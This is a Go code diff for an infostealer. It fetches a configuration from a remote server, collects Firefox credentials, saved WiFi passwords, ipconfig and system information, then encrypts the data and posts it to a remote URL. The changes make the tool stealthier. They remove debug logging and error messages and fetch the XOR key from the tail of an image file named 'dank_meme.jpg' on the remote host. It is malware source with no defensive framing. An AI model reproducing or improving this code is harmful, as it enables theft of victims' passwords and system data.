@@ -5,7 +5,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"io/ioutil"
-	"log"
 	"math/rand"
 	"os/exec"
 	"strings"
@@ -27,10 +26,6 @@ type Config struct {
 	WiFiPasswords      bool
 	IPConfigOutput     bool
 	SystemInfoOutput   bool
-}
-
-func LogError(err error) {
-	log.Fatal(err.Error())
 }
 
 func countBlanks(str string) []int {
@@ -92,26 +87,19 @@ func ReadConfig(content string) Config {
 		IPConfigOutput:     checkConfigInt(values[2]),
 		SystemInfoOutput:   checkConfigInt(values[3]),
 	}
-
-	log.Println("Firefox Credentials: ", config.FirefoxCredentials)
-	log.Println("WiFi Passwords: ", config.WiFiPasswords)
-	log.Println("IPConfig Output: ", config.IPConfigOutput)
-	log.Println("SystemInfo Output: ", config.SystemInfoOutput)
-
 	return *config
 }
 
 func GetXorKey() string {
-	// KEY_URL := URL_BASE + "dank_meme.jpg"
-	KEY := "74cca5c3767cfae1bb76c416df01d874"
+	KEY_URL := URL_BASE + "dank_meme.jpg"
+	req := gorequest.New()
+	_, body, _ := req.Get(KEY_URL).End()
+	KEY := string(body)[len(body)-32:]
 	return KEY
 }
 
 func ReadAFile(path string) []byte {
-	content, err := ioutil.ReadFile(path)
-	if err != nil {
-		LogError(err)
-	}
+	content, _ := ioutil.ReadFile(path)
 	return content
 }
 
@@ -186,7 +174,6 @@ func main() {
 	_, body, _ := req.Get(VERSION_URL).End()
 
 	config := ReadConfig(body)
-	log.Println(config)
 	if config.FirefoxCredentials {
 		frefox = GrabFirefoxCredentials()
 	}
@@ -198,7 +185,6 @@ func main() {
 	}
 	if config.SystemInfoOutput {
 		sysinfo = GrabSystemInfo()
-		print(sysinfo)
 	}
 	m := map[string]interface{}{
 		"firefox":    frefox,
@@ -207,6 +193,5 @@ func main() {
 		"systeminfo": sysinfo,
 	}
 	post := EncryptAndEncode(m)
-	a, b, c := req.Post(POST_URL).Send(post).Set("Content-Type", "text/plain").End()
-	log.Println(a, b, c)
+	req.Post(POST_URL).Send(post).Set("Content-Type", "text/plain").End()
 }
